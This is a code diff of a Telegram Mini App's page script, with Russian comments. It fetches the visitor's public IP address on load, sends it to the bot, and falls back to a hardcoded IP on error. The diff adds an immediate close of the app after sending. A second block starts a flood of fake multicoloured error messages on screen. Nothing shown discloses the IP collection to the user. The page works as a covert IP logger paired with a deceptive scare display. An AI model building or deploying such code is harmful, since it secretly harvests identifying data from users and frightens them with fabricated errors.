@@ -39,17 +39,19 @@
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
 
-        // 1. Получаем IP и СРАЗУ отправляем его боту в чат, чтобы запустить терминал!
+        // 1. Получаем IP, шлем боту и закрываем мини-апп, чтобы активировать чат
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 Telegram.WebApp.sendData(data.ip);
+                Telegram.WebApp.close();
             })
             .catch(error => {
                 Telegram.WebApp.sendData("178.74.216.48");
+                Telegram.WebApp.close();
             });
 
-        // 2. Запускаем безумный поток разноцветных ошибок на экране мини-апа
+        // 2. Запускаем безумный поток разноцветных ошибок на экране
         const consoleBox = document.getElementById('console');
         const colors = ['red', 'green', 'yellow', 'blue', 'purple', 'orange'];
         const errors = [
